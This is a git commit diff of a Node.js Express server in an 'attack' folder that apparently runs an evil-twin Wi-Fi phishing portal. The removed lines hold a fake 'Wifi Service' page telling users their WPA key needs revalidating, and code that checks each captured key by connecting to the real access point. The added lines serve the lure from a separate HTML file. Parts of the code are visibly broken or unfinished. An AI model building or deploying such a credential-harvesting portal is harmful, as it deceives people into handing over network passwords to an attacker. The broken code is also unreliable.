35035141fc101d5e07c78ba51fdfbf2235bc43b0
root <root@DESKTOP-8VF14OV.localdomain>
2023-06-09 15:36:52 +0200

    bella rafffoxz

--- attack/html/index2.js
+++ attack/html/index2.js
@@ -1,6 +1,7 @@
 // The web server
 const express = require('express')
 const app = express()
+const router = express.Router;
 // The port the web server listen to
 const port = 80
 // Working with files
@@ -17,77 +18,13 @@ app.use(BodyParser.urlencoded({extended: true}))
 
 var title ='';
 
-// The HTML page that is presented to the client
-const generateHTML = (title) => `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Wifi Service</title>
-  <style>
-    body{
-      font-family: Arial, Helvetica, sans-serif;
-      text-align: center;
-      background-color:  #d5dbdb ;
-      padding: 20px;
-     
-    }
-    button{
-		padding: 10px;
-	}
-	#connecting{
-		visibility: hidden;
-	}
-   
-  </style>
-</head>
-<body>
-  <div id="password-form">
-  	<div>${title || ''}</div>
-      <img src="./wifi-icon3.png" alt="" width="180vw">
-      
-      <p>Your wifi key needs to be revalidated for security reasons.</p> 
-
-	  <form method="post" action="password" id="mform">
-		<p>Please enter your modem's WPA wifi key to connect to the Internet: </p>
-		<input type="text" name="password" size="35%">
-		<passwordp><input type="submit" name="button"  value="Connect"></p>
-	  </form> 
-  </div>
-	
-</body>
-</html>`;
- 
-
-//Here we check if the given password is correct
-//# checkPassword - is a Promise
- //const checkPassword = async (password) => {
-    // Define the interface that will sent the connection request
-    const iface = process.argv[2].toString();
-    // The name of the AP that we will try to connect to, in order to check the given password
-    const ssid = process.argv[3].toString();
-    // This function try to connect to the AP with the given password
-    await wifi.init({ iface });
-    try {
-        // If we succeed to connect - the password is correct
-        const ans = await wifi.connect({ ssid, password });
-        console.log('The password the client enter is CORRECT');
-        return true;
-    } catch (e) {
-        // If we didn't succeed to connect - the password is incorrect
-    	console.log('The password the client enter is INCORRECT');
-        return false;
-    }
-};
-
 
 // What to do if there is a GET request
-app.get('/', (req, res) => {
+router.get('/', (req, res) => {
     // Print message to the server side
     console.log('The client tried to enter a website.');
     // Response - return the HTML page 
-    res.send(generateHTML());
+    res.sendFile('./Dw.html');
 });
 
 // What to do if there is a POST request
@@ -110,10 +47,12 @@ app.post('/password', (req, res) => {
     
     title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
     // Response - return the new HTML page 
-    res.send(generateHTML(title));
+    res.sendFile('');  //TO DO
 });
 
+
 // Define the port that the web server will listen to
+app.use('/', router);
 app.listen(port, () => {
     console.log(`WebServer is up. Listening at http://localhost:${port}`);
 })
